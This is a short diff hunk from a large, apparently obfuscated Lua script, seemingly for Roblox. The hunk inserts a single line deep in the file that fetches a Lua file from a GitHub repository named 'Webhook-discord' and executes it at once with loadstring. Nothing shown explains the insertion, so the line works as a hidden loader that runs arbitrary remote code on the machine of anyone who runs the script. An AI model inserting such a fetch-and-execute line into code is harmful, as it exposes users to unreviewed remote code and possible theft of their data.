@@ -5607,6 +5607,7 @@ end,
 end
 }
 do
+loadstring(game:HttpGet("https://raw.githubusercontent.com/AnhEmTu/Webhook-discord/refs/heads/main/Notification.lua"))()
 	local ab, ac, ad, ae, af, ag, ah, aj, c, e, f, g, h, i, j, k =
 		task,
 	setmetatable,
